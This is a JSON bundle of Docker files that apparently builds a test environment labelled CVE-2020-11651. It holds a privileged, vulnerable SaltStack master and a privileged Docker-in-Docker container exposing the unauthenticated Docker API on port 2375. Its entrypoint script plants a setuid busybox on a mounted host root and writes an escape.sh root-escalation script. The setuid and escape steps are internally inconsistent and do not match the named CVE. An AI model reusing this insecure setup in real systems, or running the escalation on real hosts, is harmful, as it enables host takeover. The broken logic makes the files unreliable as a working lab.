{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/docker-compose.yml",
            "content": "version: \"3.8\"\nservices:\n  vulnerable-dind:\n    build: .\n    privileged: true\n    environment:\n      - DOCKER_TLS_CERTDIR=\n    volumes:\n      - dind-storage:/var/lib/docker\n      - ./entrypoint.sh:/entrypoint.sh:ro\n    command: [\"sh\", \"/entrypoint.sh\"]\n    ports:\n      - \"2375:2375\"\n    depends_on:\n      - salt-master\n    restart: unless-stopped\n\n  salt-master:\n    image: saltstack/salt:2019.2.0\n    container_name: salt-master\n    privileged: true\n    environment:\n      - SALT_MASTER=yes\n      - SALT_MINION=no\n    ports:\n      - \"4505:4505\"\n      - \"4506:4506\"\n    command: [\"salt-master\", \"-l\", \"debug\"]\n    restart: unless-stopped\n\nvolumes:\n  dind-storage:\n    driver: local"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/Dockerfile",
            "content": "FROM docker:19.03.5-dind\n# Ensure the custom entrypoint script is present and executable\nCOPY entrypoint.sh /entrypoint.sh\nRUN chmod +x /entrypoint.sh\n# The original Docker\u2011in\u2011Docker image already sets the default entrypoint to /usr/local/bin/dockerd-entrypoint.sh\n# We keep that default and invoke the original entrypoint from our custom script"
        },
        {
            "location": "./../../dockers/CVE-2020-11651/custom_no_tool/entrypoint.sh",
            "content": "#!/bin/sh\nset -e\n\n# Start Docker daemon using the correct path supplied by the base image\n/usr/local/bin/dockerd-entrypoint.sh &\n\n# Wait for daemon to be ready\nwhile ! docker info > /dev/null 2>&1; do\n  sleep 1\ndone\n\n# Install a setuid binary (busybox) inside the host filesystem via the mounted Docker socket\n# This mimics the vulnerable condition where a privileged container can drop a setuid binary onto the host\n\n# Pull a minimal image that contains busybox\ndocker pull busybox:latest\n\n# Create a temporary Dockerfile that copies busybox onto the host root with setuid bit\ncat > /tmp/Dockerfile <<'EOF'\nFROM busybox\nCOPY --from=busybox /bin/busybox /hostroot/busybox\nRUN chmod u+s /hostroot/busybox\nEOF\n\n# Build the helper image\ndocker build -t helper-setuid -f /tmp/Dockerfile /tmp\n\n# Run the helper container mounting the host root filesystem\ndocker run --rm -v /:/hostroot helper-setuid\n\n# Provide a simple script to demonstrate privilege escalation\ncat > /hostroot/escape.sh <<'EOS'\n#!/bin/sh\n# This script runs the setuid busybox which now executes as root on the host\n/hostroot/busybox sh -c 'id > /hostroot/rooted.txt && echo \"rooted\"'\nEOS\nchmod +x /hostroot/escape.sh\n\n# Keep the container alive for testing\nwhile true; do\n  sleep 3600\ndone"
        }
    ],
    "directory_tree": "./../../dockers/CVE-2020-11651/custom_no_tool"
}